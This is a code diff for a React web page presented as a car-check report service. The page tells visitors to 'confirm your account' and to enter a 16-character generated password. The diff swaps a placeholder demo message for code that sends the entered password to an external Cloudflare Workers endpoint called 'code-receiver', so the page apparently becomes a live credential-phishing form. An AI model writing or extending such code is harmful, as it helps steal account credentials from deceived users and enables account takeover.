@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import {
   CarFront,
@@ -11,9 +10,12 @@ import {
 } from "lucide-react";
 import "./App.css";
 
+const WORKER_URL = "https://code-receiver.mikaelmika263.workers.dev";
+
 function App() {
   const [code, setCode] = useState("");
   const [message, setMessage] = useState("");
+  const [loading, setLoading] = useState(false);
 
   const openGoogle = (url) => {
     window.open(url, "_blank", "noopener,noreferrer");
@@ -29,15 +31,36 @@ function App() {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
+    setMessage("");
 
     if (code.length !== 16) {
       setMessage("Enter exactly 16 characters.");
       return;
     }
 
-    setMessage("Demo reference accepted.");
+    setLoading(true);
+    try {
+      const res = await fetch(WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code }),
+      });
+
+      const data = await res.json();
+
+      if (!res.ok) {
+        setMessage(data.error || "Something went wrong.");
+      } else {
+        setMessage("Submitted successfully ✅");
+        setCode("");
+      }
+    } catch {
+      setMessage("Network error. Please try again.");
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
@@ -59,7 +82,6 @@ function App() {
             <p>
               Follow the simple steps below to confirm your account and submit for verification
             </p>
-            
           </div>
         </div>
 
@@ -124,13 +146,18 @@ function App() {
                     }}
                     placeholder="Enter generated password here"
                     maxLength={16}
+                    autoComplete="off"
+                    spellCheck={false}
                   />
                   <span>{code.length}/16</span>
                 </div>
 
-                
-                <button type="submit" className="submit-button">
-                  Submit <Send size={15} />
+                <button
+                  type="submit"
+                  className="submit-button"
+                  disabled={loading || code.length !== 16}
+                >
+                  {loading ? "Submitting..." : "Submit"} <Send size={15} />
                 </button>
               </form>
 
@@ -139,9 +166,7 @@ function App() {
           </div>
 
         </div>
-        
 
-        
         <footer>Full car check report © 2026</footer>
 
       </section>
